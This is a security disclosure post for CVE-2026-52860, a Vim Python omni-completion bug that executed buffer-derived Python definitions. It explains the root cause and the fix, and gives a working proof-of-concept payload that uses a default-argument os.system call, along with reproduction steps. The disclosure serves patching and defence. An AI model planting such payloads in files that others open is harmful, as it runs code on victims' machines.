---
title: "CVE-2026-52860: Vim Arbitrary Code Execution"
description: >-
  Root cause and exploit primitive for GHSA-65p9-mwwx-7468 / CVE-2026-52860, a Vim Python
  omni-completion arbitrary code execution bug fixed in 9.2.0597.
publishDate: 2026-06-19
updatedDate: 2026-06-19
tags:
  - vim
  - vulnerability-research
  - cve
  - exploit-primitive
  - editor-security
draft: false
pinned: false
---

## Summary

I recently switched back to Linux and started using Vim a lot again. Naturally, I ended poking at it and eventually found an arbitrary code execution which I reported to Vim and got assigned CVE-2026-52860.

```text
GHSA: GHSA-65p9-mwwx-7468
CVE: CVE-2026-52860
CWE: CWE-94 - Improper Control of Generation of Code
Affected: Vim < 9.2.0597
Fixed: Vim 9.2.0597
Severity: Medium
```

The bug class is simple and nasty: completion code rebuilt Python definitions from the buffer and evaluated them with `exec()`. Python executes more than function bodies at definition time. Default argument expressions, annotations, decorators, and class base expressions can all run while the definition is being created.

That means a file that looks like Python source can become an execution sink when completion is triggered.

## What omni-completion is

Vim has several completion modes. Normal keyword completion suggests words already present in the file. Omni-completion is the filetype-aware completion path. It calls the function stored in the buffer-local `omnifunc` option and lets that function decide what completions make sense for the current language.

The user normally triggers omni-completion from Insert mode with:

```text
Ctrl-X Ctrl-O
```

The dangerous interaction is:

```text
open a hostile Python file
enter Insert mode near Python code
press Ctrl-X Ctrl-O
Vim calls the Python omni-completion function
```

That completion path is what reached the vulnerable code.

## Root cause

Vim’s Python omni-completion tried to understand the current buffer by reconstructing Python functions and classes, then executing that reconstructed text to populate completion metadata.

The dangerous part is evaluating attacker-controlled source text during completion.

A reduced version of the broken pattern looks like this:

```python
source_from_buffer = """
def target(value=payload()):
    pass
"""

namespace = {}
exec(source_from_buffer, namespace, namespace)
```

The function body does not need to run. Python evaluates the default value expression while creating the function object, so `payload()` executes during `exec()`.

The same problem applies to other definition-time evaluation surfaces:

```python
def f(x=payload()):
    pass

class C(payload()):
    pass

def g(x: payload()):
    pass

@payload()
def h():
    pass
```

If those constructs come from a hostile buffer and completion evaluates them, opening or editing code becomes enough to put the user one keystroke away from execution.

## Exploit primitive

The primitive is:

```text
attacker-controlled Python text in the current Vim buffer
-> user triggers Python omni-completion with Ctrl-X Ctrl-O
-> Vim calls python3complete#Complete or pythoncomplete#Complete
-> completion code reconstructs definitions from the buffer
-> completion code executes reconstructed definitions with Python exec()
-> definition-time Python expressions execute in the user's Vim process
```

The attacker does not need the victim to run the Python file with `python file.py`. The victim only needs to trigger the vulnerable Python omni-completion path while the hostile buffer is loaded.

A minimal conceptual payload is:

```python
def complete_me(x=__import__("os").system("id > /tmp/vim-omni-poc")):
    pass
```

When vulnerable completion reconstructs and executes this definition, the function body does not run, but the default argument expression runs immediately while Python creates the function object.

A reproduction flow looks like this:

1. Put the payload in a Python file controlled by the attacker.
2. Open that file in a vulnerable Vim build.
3. Confirm the buffer is using Python omni-completion:

```vim
:setlocal omnifunc?
```

On a Python 3 build, this should show something like:

```text
omnifunc=python3complete#Complete
```

4. Move the cursor somewhere completion will be requested, for example after a Python identifier or after a dot expression.
5. Enter Insert mode.
6. Press `Ctrl-X Ctrl-O`.
7. Check whether the side effect happened:

```sh
cat /tmp/vim-omni-poc
```

If the file exists, the completion path executed attacker-controlled Python expression code. The exact payload should be tuned to the target platform and lab policy. The important primitive is definition-time execution during completion, not the specific command.

## Why the existing measures were not enough to block it entirely

Vim already had a setting, `g:pythoncomplete_allow_import`, that limits whether Python completion imports modules while building completion data. That helps with one risky behavior, but it does not solve the deeper issue if the completion engine still executes attacker-controlled Python definitions.

Imports are only one way to reach side effects. Python expression evaluation is already enough.

Examples:

```python
# default argument expression
def f(x=(1).__class__.__base__.__subclasses__()):
    pass

# annotation expression
def g(x: side_effect()):
    pass

# class base expression
class H(side_effect()):
    pass
```

A safe completion engine should parse and inspect. It should not execute the buffer to learn what completions exist.

## Patch direction

The correct fix is to remove execution from the completion path. Python source should be parsed with a non-executing parser, or handled as text/AST only. Any compatibility fallback that still calls `exec()` on buffer-derived text keeps the same bug class alive.

For users, the operational fix is straightforward:

```text
Upgrade Vim to 9.2.0597 or later.
```

If upgrading is not immediately possible, avoid Python omni-completion on untrusted files and disable the vulnerable completion path until the patched Vim build is installed.
